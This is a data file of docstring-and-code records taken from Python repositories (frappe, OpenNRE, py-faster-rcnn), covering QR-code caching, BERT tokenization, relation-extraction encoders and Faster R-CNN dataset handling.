{"docstring": "'''Get User and SVG code from cache.'''\n", "func_signal": "def get_user_svg_from_cache():\n", "code": "key = get_query_key()\ntotp_uri = frappe.cache().get_value(\"{}_uri\".format(key))\nuser = frappe.cache().get_value(\"{}_user\".format(key))\nif not totp_uri or not user:\n\tfrappe.throw(_('Page has expired!'),frappe.PermissionError)\nif not frappe.db.exists('User',user):\n\tfrappe.throw(_('Not Permitted'), frappe.PermissionError)\nuser = frappe.get_doc('User',user)\nsvg = get_qr_svg_code(totp_uri)\nreturn (user,svg.decode())", "path": "frappe/frappe/www/qrcode.py", "commit_date": "2019-08-11 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Return the absolute path to the template's folder.\"\"\"\n", "func_signal": "def get_template_folder(self):\n", "code": "module = self.module or \"Website\"\nmodule_path = get_module_path(module)\ndoctype, docname = scrub_dt_dn(self.doctype, self.name)\n\nreturn os.path.join(module_path, doctype, docname)", "path": "frappe/frappe/website/doctype/web_template/web_template.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"update the error field with the response along with the relevant status\"\"\"\n", "func_signal": "def handle_failure(self, response):\n", "code": "if isinstance(response, string_types):\n\tresponse = json.loads(response)\nself.db_set(\"status\", \"Failed\")\nself.db_set(\"error\", json.dumps(response, default=json_handler))", "path": "frappe/frappe/integrations/doctype/integration_request/integration_request.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "'''\n\tparam:\n\tDoctype name\n\tdoc name\n\tuser email\n\n\tcondition:\n\tavoided for some doctype\n\tfollow only if track changes are set to 1\n'''\n", "func_signal": "def follow_document(doctype, doc_name, user):\n", "code": "if (doctype in (\"Communication\", \"ToDo\", \"Email Unsubscribe\", \"File\", \"Comment\", \"Email Account\", \"Email Domain\")\n\tor doctype in log_types):\n\treturn\n\nif ((not frappe.get_meta(doctype).track_changes)\n\tor user == \"Administrator\"):\n\treturn\n\nif not frappe.db.get_value(\"User\", user, \"document_follow_notify\", ignore=True, cache=True):\n\treturn\n\nif not is_document_followed(doctype, doc_name, user):\n\tdoc = frappe.new_doc(\"Document Follow\")\n\tdoc.update({\n\t\t\"ref_doctype\": doctype,\n\t\t\"ref_docname\": doc_name,\n\t\t\"user\": user\n\t})\n\tdoc.save()\n\treturn doc", "path": "frappe/frappe/desk/form/document_follow.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"\n   Return the :term:`doclist` of the `Page` specified by `name`\n\"\"\"\n", "func_signal": "def get(name):\n", "code": "page = frappe.get_doc('Page', name)\nif page.is_permitted():\n\tpage.load_assets()\n\tdocs = frappe._dict(page.as_dict())\n\tif getattr(page, '_dynamic_page', None):\n\t\tdocs['_dynamic_page'] = 1\n\n\treturn docs\nelse:\n\tfrappe.response['403'] = 1\n\traise frappe.PermissionError('No read permission for Page %s' %(page.title or name))", "path": "frappe/frappe/desk/desk_page.py", "commit_date": "2017-06-19 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"    Checks whether `chars` is a control character.\n    These are technically control characters but we count them as whitespace characters.\n\"\"\"\n", "func_signal": "def is_control(char):\n", "code": "if char == \"\\t\" or char == \"\\n\" or char == \"\\r\":\n    return False\ncat = unicodedata.category(char)\nif cat.startswith(\"C\"):\n    return True\nreturn False", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Converts `text` to Unicode (if it's not already), assuming utf-8 input.\"\"\"\n", "func_signal": "def convert_to_unicode(text):\n", "code": "if six.PY3:\n    if isinstance(text, str):\n        return text\n    elif isinstance(text, bytes):\n        return text.decode(\"utf-8\", \"ignore\")\n    else:\n        raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n    if isinstance(text, str):\n        return text.decode(\"utf-8\", \"ignore\")\n    elif isinstance(text, unicode):\n        return text\n    else:\n        raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n    raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Loads a vocabulary file into a dictionary.\"\"\"\n", "func_signal": "def load_vocab(vocab_file):\n", "code": "if vocab_file ==  None:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nif isinstance(vocab_file, str) or isinstance(vocab_file, bytes):\n    vocab = collections.OrderedDict()\n    index = 0\n    with open(vocab_file, \"r\", encoding=\"utf-8\") as reader:\n        while True:\n            token = reader.readline()\n            if not token:\n                break\n            token = token.strip()\n            vocab[token] = index\n            index += 1\n    return vocab\nelse:\n    return vocab_file", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"    Returns text encoded in a way suitable for print or `tf.logging`.\n    These functions want `str` for both Python2 and Python3, but in one case\n    it's a Unicode string and in the other it's a byte string.\n\"\"\"\n", "func_signal": "def printable_text(text):\n", "code": "if six.PY3:\n    if isinstance(text, str):\n        return text\n    elif isinstance(text, bytes):\n        return text.decode(\"utf-8\", \"ignore\")\n    else:\n        raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n    if isinstance(text, str):\n        return text\n    elif isinstance(text, unicode):\n        return text.encode(\"utf-8\")\n    else:\n        raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n    raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    item: data instance containing 'text' / 'token', 'h' and 't'\nReturn:\n    Name of the relation of the sentence\n\"\"\"\n# Sentence -> token\n", "func_signal": "def tokenize(self, item):\n", "code": "if 'text' in item:\n    sentence = item['text']\n    is_token = False\nelse:\n    sentence = item['token']\n    is_token = True\npos_head = item['h']['pos']\npos_tail = item['t']['pos']\n\npos_min = pos_head\npos_max = pos_tail\nif pos_head[0] > pos_tail[0]:\n    pos_min = pos_tail\n    pos_max = pos_head\n    rev = True\nelse:\n    rev = False\n\nif not is_token:\n    sent0 = self.tokenizer.tokenize(sentence[:pos_min[0]])\n    ent0 = self.tokenizer.tokenize(sentence[pos_min[0]:pos_min[1]])\n    sent1 = self.tokenizer.tokenize(sentence[pos_min[1]:pos_max[0]])\n    ent1 = self.tokenizer.tokenize(sentence[pos_max[0]:pos_max[1]])\n    sent2 = self.tokenizer.tokenize(sentence[pos_max[1]:])\nelse:\n    sent0 = self.tokenizer.tokenize(' '.join(sentence[:pos_min[0]]))\n    ent0 = self.tokenizer.tokenize(' '.join(sentence[pos_min[0]:pos_min[1]]))\n    sent1 = self.tokenizer.tokenize(' '.join(sentence[pos_min[1]:pos_max[0]]))\n    ent1 = self.tokenizer.tokenize(' '.join(sentence[pos_max[0]:pos_max[1]]))\n    sent2 = self.tokenizer.tokenize(' '.join(sentence[pos_max[1]:]))\n\nif self.mask_entity:\n    ent0 = ['[unused4]'] if not rev else ['[unused5]']\n    ent1 = ['[unused5]'] if not rev else ['[unused4]']\nelse:\n    ent0 = ['[unused0]'] + ent0 + ['[unused1]'] if not rev else ['[unused2]'] + ent0 + ['[unused3]']\n    ent1 = ['[unused2]'] + ent1 + ['[unused3]'] if not rev else ['[unused0]'] + ent1 + ['[unused1]']\n\nre_tokens = ['[CLS]'] + sent0 + ent0 + sent1 + ent1 + sent2 + ['[SEP]']\n\nindexed_tokens = self.tokenizer.convert_tokens_to_ids(re_tokens)\navai_len = len(indexed_tokens)\n\n# Padding\nif self.blank_padding:\n    while len(indexed_tokens) < self.max_length:\n        indexed_tokens.append(0)  # 0 is id for [PAD]\n    indexed_tokens = indexed_tokens[:self.max_length]\nindexed_tokens = torch.tensor(indexed_tokens).long().unsqueeze(0)  # (1, L)\n\n# Attention mask\natt_mask = torch.zeros(indexed_tokens.size()).long()  # (1, L)\natt_mask[0, :avai_len] = 1\n\nreturn indexed_tokens, att_mask", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"    Checks whether `chars` is a whitespace character.\n    \\t, \\n, and \\r are technically contorl characters but we treat them\n    as whitespace since they are generally considered as such.\n\"\"\"\n", "func_signal": "def is_whitespace(char):\n", "code": "if char == \" \" or char == \"\\t\" or char == \"\\n\" or char == \"\\r\":\n    return True\ncat = unicodedata.category(char)\nif cat == \"Zs\":\n    return True\nreturn False", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    max_length: max length of sentence\n    pretrain_path: path of pretrain model\n\"\"\"\n", "func_signal": "def __init__(self, max_length, pretrain_path, blank_padding=True, mask_entity=False):\n", "code": "super().__init__()\nself.max_length = max_length\nself.blank_padding = blank_padding\nself.hidden_size = 768\nself.mask_entity = mask_entity\nlogging.info('Loading BERT pre-trained checkpoint.')\nself.bert = BertModel.from_pretrained(pretrain_path)\nself.tokenizer = BertTokenizer.from_pretrained(pretrain_path)", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    max_length: max length of sentence\n    pretrain_path: path of pretrain model\n\"\"\"\n", "func_signal": "def __init__(self, max_length, pretrain_path, blank_padding=True, mask_entity=False):\n", "code": "super().__init__()\nself.max_length = max_length\nself.blank_padding = blank_padding\nself.hidden_size = 768 * 2\nself.mask_entity = mask_entity\nlogging.info('Loading BERT pre-trained checkpoint.')\nself.bert = BertModel.from_pretrained(pretrain_path)\nself.tokenizer = BertTokenizer.from_pretrained(pretrain_path)\nself.linear = nn.Linear(self.hidden_size, self.hidden_size)", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\" Checks whether `chars` is a punctuation character.\n    We treat all non-letter/number ASCII as punctuation. Characters such as \"^\", \"$\", and \"`\" are not in the Unicode.\n    Punctuation class but we treat them as punctuation anyways, for consistency.\n\"\"\"\n", "func_signal": "def is_punctuation(char):\n", "code": "cp = ord(char)\nif ((cp >= 33 and cp <= 47) or (cp >= 58 and cp <= 64) or (cp >= 91 and cp <= 96) or (cp >= 123 and cp <= 126)):\n    return True\ncat = unicodedata.category(char)\nif cat.startswith(\"P\"):\n    return True\nreturn False", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    token: (B, L), index of tokens\n    att_mask: (B, L), attention mask (1 for contents and 0 for padding)\nReturn:\n    (B, H), representations for sentences\n\"\"\"\n", "func_signal": "def forward(self, token, att_mask):\n", "code": "_, x = self.bert(token, attention_mask=att_mask)\nreturn x", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    item: data instance containing 'text' / 'token', 'h' and 't'\nReturn:\n    Name of the relation of the sentence\n\"\"\"\n# Sentence -> token\n", "func_signal": "def tokenize(self, item):\n", "code": "if 'text' in item:\n    sentence = item['text']\n    is_token = False\nelse:\n    sentence = item['token']\n    is_token = True\npos_head = item['h']['pos']\npos_tail = item['t']['pos']\n\npos_min = pos_head\npos_max = pos_tail\nif pos_head[0] > pos_tail[0]:\n    pos_min = pos_tail\n    pos_max = pos_head\n    rev = True\nelse:\n    rev = False\n\nif not is_token:\n    sent0 = self.tokenizer.tokenize(sentence[:pos_min[0]])\n    ent0 = self.tokenizer.tokenize(sentence[pos_min[0]:pos_min[1]])\n    sent1 = self.tokenizer.tokenize(sentence[pos_min[1]:pos_max[0]])\n    ent1 = self.tokenizer.tokenize(sentence[pos_max[0]:pos_max[1]])\n    sent2 = self.tokenizer.tokenize(sentence[pos_max[1]:])\nelse:\n    sent0 = self.tokenizer.tokenize(' '.join(sentence[:pos_min[0]]))\n    ent0 = self.tokenizer.tokenize(' '.join(sentence[pos_min[0]:pos_min[1]]))\n    sent1 = self.tokenizer.tokenize(' '.join(sentence[pos_min[1]:pos_max[0]]))\n    ent1 = self.tokenizer.tokenize(' '.join(sentence[pos_max[0]:pos_max[1]]))\n    sent2 = self.tokenizer.tokenize(' '.join(sentence[pos_max[1]:]))\n\nif self.mask_entity:\n    ent0 = ['[unused4]'] if not rev else ['[unused5]']\n    ent1 = ['[unused5]'] if not rev else ['[unused4]']\nelse:\n    ent0 = ['[unused0]'] + ent0 + ['[unused1]'] if not rev else ['[unused2]'] + ent0 + ['[unused3]']\n    ent1 = ['[unused2]'] + ent1 + ['[unused3]'] if not rev else ['[unused0]'] + ent1 + ['[unused1]']\n\nre_tokens = ['[CLS]'] + sent0 + ent0 + sent1 + ent1 + sent2 + ['[SEP]']\npos1 = 1 + len(sent0) if not rev else 1 + len(sent0 + ent0 + sent1)\npos2 = 1 + len(sent0 + ent0 + sent1) if not rev else 1 + len(sent0)\npos1 = min(self.max_length - 1, pos1)\npos2 = min(self.max_length - 1, pos2)\n\nindexed_tokens = self.tokenizer.convert_tokens_to_ids(re_tokens)\navai_len = len(indexed_tokens)\n\n# Position\npos1 = torch.tensor([[pos1]]).long()\npos2 = torch.tensor([[pos2]]).long()\n\n# Padding\nif self.blank_padding:\n    while len(indexed_tokens) < self.max_length:\n        indexed_tokens.append(0)  # 0 is id for [PAD]\n    indexed_tokens = indexed_tokens[:self.max_length]\nindexed_tokens = torch.tensor(indexed_tokens).long().unsqueeze(0)  # (1, L)\n\n# Attention mask\natt_mask = torch.zeros(indexed_tokens.size()).long()  # (1, L)\natt_mask[0, :avai_len] = 1\n\nreturn indexed_tokens, att_mask, pos1, pos2", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    token: (B, L), index of tokens\n    att_mask: (B, L), attention mask (1 for contents and 0 for padding)\n    pos1: (B, 1), position of the head entity starter\n    pos2: (B, 1), position of the tail entity starter\nReturn:\n    (B, 2H), representations for sentences\n\"\"\"\n", "func_signal": "def forward(self, token, att_mask, pos1, pos2):\n", "code": "hidden, _ = self.bert(token, attention_mask=att_mask)\n# Get entity start hidden state\nonehot_head = torch.zeros(hidden.size()[:2]).float().to(hidden.device)  # (B, L)\nonehot_tail = torch.zeros(hidden.size()[:2]).float().to(hidden.device)  # (B, L)\nonehot_head = onehot_head.scatter_(1, pos1, 1)\nonehot_tail = onehot_tail.scatter_(1, pos2, 1)\nhead_hidden = (onehot_head.unsqueeze(2) * hidden).sum(1)  # (B, H)\ntail_hidden = (onehot_tail.unsqueeze(2) * hidden).sum(1)  # (B, H)\nx = torch.cat([head_hidden, tail_hidden], 1)  # (B, 2H)\nx = self.linear(x)\nreturn x", "path": "OpenNRE/opennre/encoder/bert_encoder.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Splits punctuation on a piece of text.\"\"\"\n", "func_signal": "def split_on_punctuation(text):\n", "code": "start_new_word = True\noutput = []\nfor char in text:\n    if is_punctuation(char):\n        output.append([char])\n        start_new_word = True\n    else:\n        if start_new_word:\n            output.append([])\n        start_new_word = False\n        output[-1].append(char)\nreturn [\"\".join(x) for x in output]", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"    Checks whether CP is the codepoint of a CJK character.\n    This defines a \"chinese character\" as anything in the CJK Unicode block:\n    https://en.wikipedia.org/wiki/CJK_Unified_Ideographs_(Unicode_block)\n    Note that the CJK Unicode block is NOT all Japanese and Korean characters,\n    despite its name. The modern Korean Hangul alphabet is a different block,\n    as is Japanese Hiragana and Katakana. Those alphabets are used to write\n    space-separated words, so they are not treated specially and handled\n    like the all of the other languages.\n\"\"\"\n", "func_signal": "def is_chinese_char(cp):\n", "code": "if ((cp >= 0x4E00 and cp <= 0x9FFF) or\n    (cp >= 0x3400 and cp <= 0x4DBF) or\n    (cp >= 0x20000 and cp <= 0x2A6DF) or\n    (cp >= 0x2A700 and cp <= 0x2B73F) or\n    (cp >= 0x2B740 and cp <= 0x2B81F) or\n    (cp >= 0x2B820 and cp <= 0x2CEAF) or\n    (cp >= 0xF900 and cp <= 0xFAFF) or\n    (cp >= 0x2F800 and cp <= 0x2FA1F)):\n    return True\nreturn False", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Converts a sequence of [tokens|ids] using the vocab.\"\"\"\n", "func_signal": "def convert_by_vocab(vocab, items, max_seq_length = None, blank_id = 0, unk_id = 1, uncased = True):\n", "code": "output = []\nfor item in items:\n    if uncased:\n        item = item.lower()\n    if item in vocab:\n        output.append(vocab[item])\n    else:\n        output.append(unk_id)\nif max_seq_length != None:\n    if len(output) > max_seq_length:\n        output = output[:max_seq_length]\n    else:\n        while len(output) < max_seq_length:\n            output.append(blank_id)\nreturn output", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"\nArgs:\n    input_size: dimention of input embedding\n    kernel_size: kernel_size for CNN\n    padding: padding for CNN\nhidden_size: hidden size\n\"\"\"\n", "func_signal": "def __init__(self, kernel_size, segment_num=None):\n", "code": "super().__init__()\nself.segment_num = segment_num\nif self.segment_num != None:\n    self.mask_embedding = nn.Embedding(segment_num + 1, segment_num)\n    self.mask_embedding.weight.data.copy_(torch.FloatTensor(np.concatenate([np.zeros(segment_num), np.identity(segment_num)], axis = 0)))\n    self.mask_embedding.weight.requires_grad = False\nself.pool = nn.AvgPool1d(kernel_size)", "path": "OpenNRE/opennre/module/pool/avg_pool.py", "commit_date": "2019-08-10 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Strips accents from a piece of text.\"\"\"\n", "func_signal": "def strip_accents(text):\n", "code": "text = unicodedata.normalize(\"NFD\", text)\noutput = []\nfor char in text:\n    cat = unicodedata.category(char)\n    if cat == \"Mn\":\n        continue\n    output.append(char)\nreturn \"\".join(output)", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Truncates a pair of sequences to a maximum sequence length.\"\"\"\n", "func_signal": "def truncate_seq_pair(tokens_a, tokens_b, max_num_tokens, rng):\n", "code": "while True:\n    total_length = len(tokens_a) + len(tokens_b)\n    if total_length <= max_num_tokens:\n        break\n    trunc_tokens = tokens_a if len(tokens_a) > len(tokens_b) else tokens_b\n    assert len(trunc_tokens) >= 1\n    # We want to sometimes truncate from the front and sometimes from the\n    # back to add more randomness and avoid biases.\n    if rng.random() < 0.5:\n        del trunc_tokens[0]\n    else:\n        trunc_tokens.pop()", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\" Runs basic whitespace cleaning and splitting on a peice of text.\ne.g, 'a b c' -> ['a', 'b', 'c']\n\"\"\"\n", "func_signal": "def split_on_whitespace(text):\n", "code": "text = text.strip()\nif not text:\n    return []\nreturn text.split()", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Adds whitespace around any CJK character.\"\"\"\n", "func_signal": "def tokenize_chinese_chars(text):\n", "code": "output = []\nfor char in text:\n    cp = ord(char)\n    if is_chinese_char(cp):\n        output.append(\" \")\n        output.append(char)\n        output.append(\" \")\n    else:\n        output.append(char)\nreturn \"\".join(output)", "path": "OpenNRE/opennre/tokenization/utils.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "thunlp/OpenNRE", "stars": 4197, "license": "mit", "language": "python", "size": 273293}
{"docstring": "\"\"\"Return indices of unique boxes.\"\"\"\n", "func_signal": "def unique_boxes(boxes, scale=1.0):\n", "code": "v = np.array([1, 1e3, 1e6, 1e9])\nhashes = np.round(boxes * scale).dot(v)\n_, index = np.unique(hashes, return_index=True)\nreturn np.sort(index)", "path": "py-faster-rcnn/lib/datasets/ds_utils.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Randomly permute the training roidb.\"\"\"\n# TODO(rbg): remove duplicated code\n", "func_signal": "def _shuffle_roidb_inds(self):\n", "code": "self._perm = np.random.permutation(np.arange(len(self._roidb)))\nself._cur = 0", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n    self._shuffle_roidb_inds()\n\ndb_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\nself._cur += cfg.TRAIN.IMS_PER_BATCH\nreturn db_inds", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Dispatch to either CPU or GPU NMS implementations.\"\"\"\n\n", "func_signal": "def nms(dets, thresh, force_cpu=False):\n", "code": "if dets.shape[0] == 0:\n    return []\nif cfg.USE_GPU_NMS and not force_cpu:\n    return gpu_nms(dets, thresh, device_id=cfg.GPU_ID)\nelse:\n    return cpu_nms(dets, thresh)", "path": "py-faster-rcnn/lib/fast_rcnn/nms_wrapper.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "# first 14 chars / first 22 chars / all chars + .mat\n# COCO_val2014_0/COCO_val2014_000000447/COCO_val2014_000000447991.mat\n", "func_signal": "def _get_box_file(self, index):\n", "code": "file_name = ('COCO_' + self._data_name +\n             '_' + str(index).zfill(12) + '.mat')\nreturn osp.join(file_name[:14], file_name[:22], file_name)", "path": "py-faster-rcnn/lib/datasets/coco.py", "commit_date": "2016-02-24 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n# TODO(rbg): remove duplicated code\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n    self._shuffle_roidb_inds()\n\ndb_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\nself._cur += cfg.TRAIN.IMS_PER_BATCH\nreturn db_inds", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nLoads COCO bounding-box instance annotations. Crowd instances are\nhandled by marking their overlaps (with all categories) to -1. This\noverlap value means that crowd \"instances\" are excluded from training.\n\"\"\"\n", "func_signal": "def _load_coco_annotation(self, index):\n", "code": "im_ann = self._COCO.loadImgs(index)[0]\nwidth = im_ann['width']\nheight = im_ann['height']\n\nannIds = self._COCO.getAnnIds(imgIds=index, iscrowd=None)\nobjs = self._COCO.loadAnns(annIds)\n# Sanitize bboxes -- some are invalid\nvalid_objs = []\nfor obj in objs:\n    x1 = np.max((0, obj['bbox'][0]))\n    y1 = np.max((0, obj['bbox'][1]))\n    x2 = np.min((width - 1, x1 + np.max((0, obj['bbox'][2] - 1))))\n    y2 = np.min((height - 1, y1 + np.max((0, obj['bbox'][3] - 1))))\n    if obj['area'] > 0 and x2 >= x1 and y2 >= y1:\n        obj['clean_bbox'] = [x1, y1, x2, y2]\n        valid_objs.append(obj)\nobjs = valid_objs\nnum_objs = len(objs)\n\nboxes = np.zeros((num_objs, 4), dtype=np.uint16)\ngt_classes = np.zeros((num_objs), dtype=np.int32)\noverlaps = np.zeros((num_objs, self.num_classes), dtype=np.float32)\nseg_areas = np.zeros((num_objs), dtype=np.float32)\n\n# Lookup table to map from COCO category ids to our internal class\n# indices\ncoco_cat_id_to_class_ind = dict([(self._class_to_coco_cat_id[cls],\n                                  self._class_to_ind[cls])\n                                 for cls in self._classes[1:]])\n\nfor ix, obj in enumerate(objs):\n    cls = coco_cat_id_to_class_ind[obj['category_id']]\n    boxes[ix, :] = obj['clean_bbox']\n    gt_classes[ix] = cls\n    seg_areas[ix] = obj['area']\n    if obj['iscrowd']:\n        # Set overlap to -1 for all classes for crowd objects\n        # so they will be excluded during training\n        overlaps[ix, :] = -1.0\n    else:\n        overlaps[ix, cls] = 1.0\n\nds_utils.validate_boxes(boxes, width=width, height=height)\noverlaps = scipy.sparse.csr_matrix(overlaps)\nreturn {'boxes' : boxes,\n        'gt_classes': gt_classes,\n        'gt_overlaps' : overlaps,\n        'flipped' : False,\n        'seg_areas' : seg_areas}", "path": "py-faster-rcnn/lib/datasets/coco.py", "commit_date": "2016-02-24 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nFinds proposals that are inside crowd regions and marks them with\noverlap = -1 (for all gt rois), which means they will be excluded from\ntraining.\n\"\"\"\n", "func_signal": "def _filter_crowd_proposals(roidb, crowd_thresh):\n", "code": "for ix, entry in enumerate(roidb):\n    overlaps = entry['gt_overlaps'].toarray()\n    crowd_inds = np.where(overlaps.max(axis=1) == -1)[0]\n    non_gt_inds = np.where(entry['gt_classes'] == 0)[0]\n    if len(crowd_inds) == 0 or len(non_gt_inds) == 0:\n        continue\n    iscrowd = [int(True) for _ in xrange(len(crowd_inds))]\n    crowd_boxes = ds_utils.xyxy_to_xywh(entry['boxes'][crowd_inds, :])\n    non_gt_boxes = ds_utils.xyxy_to_xywh(entry['boxes'][non_gt_inds, :])\n    ious = COCOmask.iou(non_gt_boxes, crowd_boxes, iscrowd)\n    bad_inds = np.where(ious.max(axis=1) > crowd_thresh)[0]\n    overlaps[non_gt_inds[bad_inds], :] = -1\n    roidb[ix]['gt_overlaps'] = scipy.sparse.csr_matrix(overlaps)\nreturn roidb", "path": "py-faster-rcnn/lib/datasets/coco.py", "commit_date": "2016-02-24 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Train a Faster R-CNN network')\nparser.add_argument('--gpu', dest='gpu_id',\n                    help='GPU device id to use [0]',\n                    default=0, type=int)\nparser.add_argument('--net_name', dest='net_name',\n                    help='network name (e.g., \"ZF\")',\n                    default=None, type=str)\nparser.add_argument('--weights', dest='pretrained_model',\n                    help='initialize with pretrained model weights',\n                    default=None, type=str)\nparser.add_argument('--cfg', dest='cfg_file',\n                    help='optional config file',\n                    default=None, type=str)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to train on',\n                    default='voc_2007_trainval', type=str)\nparser.add_argument('--set', dest='set_cfgs',\n                    help='set config keys', default=None,\n                    nargs=argparse.REMAINDER)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "py-faster-rcnn/tools/train_faster_rcnn_alt_opt.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
